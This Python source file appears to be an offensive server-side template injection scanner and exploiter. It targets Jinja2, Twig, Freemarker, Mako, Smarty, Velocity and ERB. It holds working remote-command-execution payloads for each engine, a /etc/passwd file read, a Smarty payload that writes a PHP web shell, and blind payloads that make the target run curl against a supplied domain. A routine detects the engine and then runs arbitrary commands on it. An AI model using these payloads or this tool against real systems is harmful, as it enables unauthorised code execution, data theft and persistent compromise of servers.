#!/usr/bin/env python
"""
GenSQL Technique: Advanced SSTI Scanner & Exploiter
Author: Jeevraj
Engines: Jinja2, Twig, Freemarker, Mako, Smarty, Velocity, ERB
"""
import re
import urllib.request
import urllib.parse
import time


class AdvancedSSTI:
    """Detects and exploits SSTI in all major template engines. Author: Jeevraj"""

    # (payload, expected_result, engine_hint)
    DETECTION_PROBES = [
        ("{{7*7}}", "49", "jinja2/twig"),
        ("${7*7}", "49", "freemarker/mako/el"),
        ("#{7*7}", "49", "velocity/ruby"),
        ("<%= 7*7 %>", "49", "erb/asp"),
        ("{{7*'7'}}", "7777777", "jinja2"),
        ("{7*7}", "49", "smarty"),
        ("@(7*7)", "49", "razor"),
        ("*{7*7}", "49", "thymeleaf"),
        ("[[${7*7}]]", "49", "thymeleaf2"),
    ]

    PAYLOADS = {
        "jinja2": {
            "detect":    "{{7*7}}",
            "rce":       "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "rce_alt":   "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c.__init__.__globals__['os'].popen('id').read()}}{%endif%}{%endfor%}",
            "read_file": "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "config":    "{{config.items()}}",
            "globals":   "{{''.__class__.__mro__[1].__subclasses__()}}",
        },
        "twig": {
            "detect":    "{{7*7}}",
            "rce":       "{{['id']|map('system')|join}}",
            "rce_alt":   "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        },
        "freemarker": {
            "detect":  "${7*7}",
            "rce":     '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            "rce_alt": '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
        },
        "mako": {
            "detect":  "${7*7}",
            "rce":     "${__import__('os').popen('id').read()}",
            "rce_alt": "<%import os%>${os.popen('id').read()}",
        },
        "smarty": {
            "detect":  "{7*7}",
            "rce":     "{php}echo shell_exec('id');{/php}",
            "rce_v4":  '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]);?>",self::clearConfig())}',
        },
        "velocity": {
            "detect":  "#set($x=7*7)${x}",
            "rce":     "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))${ex.text}",
        },
        "erb": {
            "detect":  "<%= 7*7 %>",
            "rce":     "<%= `id` %>",
            "rce_alt": "<%= IO.popen('id').read %>",
        },
    }

    # Blind OOB payloads — {domain} replaced at runtime
    BLIND_OOB_TEMPLATES = {
        "jinja2":     "{{''.__class__.__mro__[1].__subclasses__()[396]('curl DOMAIN',shell=True)}}",
        "twig":       "{{['curl DOMAIN']|map('system')}}",
        "freemarker": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl DOMAIN")}',
        "mako":       "${__import__('os').system('curl DOMAIN')}",
        "smarty":     "{php}system('curl DOMAIN');{/php}",
    }

    ENGINE_ERROR_SIGNATURES = {
        "jinja2":     [r"jinja2", r"undefined error", r"templatenotfound"],
        "twig":       [r"twig\\error", r"twig_template", r"twig"],
        "freemarker": [r"freemarker", r"ftl exception"],
        "mako":       [r"mako\.exceptions", r"mako template"],
        "smarty":     [r"smarty", r"smartyexception"],
        "velocity":   [r"velocityexception", r"org\.apache\.velocity"],
    }

    def __init__(self, timeout=15):
        self.timeout     = timeout
        self._detections = {}

    # ── Detection ─────────────────────────────────────────────────────────
    def probe_ssti(self, url, param, method="GET"):
        """Send SSTI detection probes; return list of confirmed results."""
        results = []
        for payload, expected, engine_hint in self.DETECTION_PROBES:
            resp = self._inject(url, param, payload, method)
            if resp and expected in str(resp.get("body", "")):
                engine = engine_hint.split("/")[0]
                self._detections[url] = engine
                results.append({"payload": payload, "expected": expected,
                                 "engine": engine, "confirmed": True})
        return results

    def detect_engine(self, response_body, url=""):
        """Identify template engine from error messages."""
        body = (response_body or "").lower()
        for engine, patterns in self.ENGINE_ERROR_SIGNATURES.items():
            if any(re.search(p, body) for p in patterns):
                return engine
        return None

    # ── Per-engine exploits ───────────────────────────────────────────────
    def exploit_jinja2(self, url, param, command="id", method="GET"):
        payload = self.PAYLOADS["jinja2"]["rce"].replace("'id'", repr(command))
        return self._inject(url, param, payload, method)

    def exploit_twig(self, url, param, command="id", method="GET"):
        payload = self.PAYLOADS["twig"]["rce"].replace("'id'", repr(command))
        return self._inject(url, param, payload, method)

    def exploit_freemarker(self, url, param, command="id", method="GET"):
        payload = self.PAYLOADS["freemarker"]["rce"].replace('"id"', repr(command))
        return self._inject(url, param, payload, method)

    def exploit_mako(self, url, param, command="id", method="GET"):
        payload = self.PAYLOADS["mako"]["rce"].replace("'id'", repr(command))
        return self._inject(url, param, payload, method)

    def exploit_smarty(self, url, param, command="id", method="GET"):
        payload = '{php}echo shell_exec(%s);{/php}' % repr(command)
        return self._inject(url, param, payload, method)

    # ── Auto-chain to RCE ────────────────────────────────────────────────
    def ssti_to_rce_chain(self, url, param, command="id", method="GET"):
        """Auto-detect engine then attempt RCE."""
        probes = self.probe_ssti(url, param, method)
        if not probes:
            return {"injectable": False}
        engine = self._detections.get(url, "jinja2")
        dispatch = {
            "jinja2":     self.exploit_jinja2,
            "twig":       self.exploit_twig,
            "freemarker": self.exploit_freemarker,
            "mako":       self.exploit_mako,
            "smarty":     self.exploit_smarty,
        }
        fn = dispatch.get(engine)
        if fn:
            rce = fn(url, param, command, method)
            return {"injectable": True, "engine": engine, "rce": rce}
        return {"injectable": True, "engine": engine, "rce": False}

    # ── Blind SSTI via OOB ────────────────────────────────────────────────
    def blind_ssti_dns(self, url, param, domain, method="GET"):
        """Blind SSTI with DNS OOB callback."""
        results = []
        for engine, tpl in self.BLIND_OOB_TEMPLATES.items():
            payload = tpl.replace("DOMAIN", domain)
            resp = self._inject(url, param, payload, method)
            results.append({"engine": engine, "payload": payload,
                             "status": resp.get("status") if resp else None})
        return results

    # ── Helper ────────────────────────────────────────────────────────────
    def _inject(self, url, param, payload, method="GET"):
        try:
            if method.upper() == "GET":
                sep = "&" if "?" in url else "?"
                target = url + sep + urllib.parse.urlencode({param: payload})
                req = urllib.request.Request(target)
            else:
                data = urllib.parse.urlencode({param: payload}).encode()
                req = urllib.request.Request(url, data=data)
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
        except Exception as ex:
            return {"error": str(ex)}
